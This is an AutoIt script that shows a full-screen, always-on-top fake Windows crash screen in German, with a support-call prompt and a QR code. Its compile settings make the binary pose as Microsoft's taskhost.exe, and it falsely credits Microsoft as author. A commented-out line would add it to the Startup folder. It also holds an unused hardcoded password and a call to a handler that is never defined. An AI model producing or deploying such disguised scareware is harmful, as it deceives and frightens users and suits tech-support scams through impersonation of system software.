#cs ----------------------------------------------------------------------------

Version: 0.2.6
 Author:      Microsoft ©. Alle Rechte vorbehalten.

 Script Function:

#ce ----------------------------------------------------------------------------

; Script Start - Add your code below here
#include <ButtonConstants.au3>
#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
#include <AutoItConstants.au3>
Local $myPw = "1234"
Local $PW_OK = 0
Local $iAnswer = 7


#Region ### START Koda GUI section ### Form
#pragma compile(ProductVersion, 6.1.7601.18010)
	#pragma compile(FileDescription,Hostprozess für Windows-Aufgaben)
	#pragma compile(ProductName,Betriebsystem Microsoft® Windows®)
	#pragma compile(FileVersion, 6.1.7601.18010)
		#pragma compile(LegalCopyright,© Microsoft Corporation. Alle Rechte vorbehalten.)
		#pragma compile(OriginalFilename, taskhost.exe)
		#pragma compile(CompanyName, 'Microsoft Corporation')
$inputb=GUICreate("Microsoft Windows", @DesktopWidth, @DesktopHeight, 0, 0,BitOR($WS_POPUP,$WS_CLIPSIBLINGS))
;GUISetBkColor(0x4970F0);0x0A5BC4  0x4169E1  4970F0
GUISetBkColor(0x1f67b1);0x0A5BC4  0x4169E1  4970F0
$Label1 = GUICtrlCreateLabel("Auf dem PC ist ein Problem aufgetreten. Er muss neu gestartet werden. Es werden einige Fehlerinformationen gesammelt, und dann wird ein Neustart ausgeführt.       (100% abgeschlossen)", 230, 370, 653, 106);453,
GUICtrlSetFont(-1, 16, 500, 0, "Verdana")
GUICtrlSetColor(-1, 0xffffff)
$Label1 = GUICtrlCreateLabel("Informationen zu diesem Problem und mögliche Lösungen finden sie unter http://windows.com/stopcode", 450, 600, 1353, 106);453,
GUICtrlSetFont(-1, 11, 500, 0, "Verdana")
GUICtrlSetColor(-1, 0xffffff)
$Label1 = GUICtrlCreateLabel("Halten Sie folgende Infos bereit, wenn Sie den Support anrufen", 450, 680, 653, 106);453,
GUICtrlSetFont(-1, 11, 500, 0, "Verdana")
GUICtrlSetColor(-1, 0xffffff)
$Label1 = GUICtrlCreateLabel("Stillstandcode: MANUALLY_INITIATED_CRASH", 450, 730, 653, 106);453,
GUICtrlSetFont(-1, 11, 500, 0, "Verdana")
GUICtrlSetColor(-1, 0xffffff)
GUICtrlCreatePic("winsmyl-2.jpg", 170, 120, 250, 250)
GUICtrlSetColor(-1, 0xC0C0C0)
GUICtrlCreatePic("qr.jpg", 230, 600, 170, 170)
GUICtrlSetColor(-1, 0xC0C0C0)




GUISetState(@SW_SHOW)
;FileCreateShortcut(@AutoItExe, @StartupDir & "\" & @ScriptName & ".lnk", @ScriptDir)
GUISetState(@SW_SHOW)
 WinSetOnTop($inputb, "",1)
#EndRegion ### END Koda GUI section ###

GUIRegisterMsg($WM_COMMAND, '_WM_COMMAND')


While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
	Case $GUI_EVENT_CLOSE
exit
   EndSwitch
wend


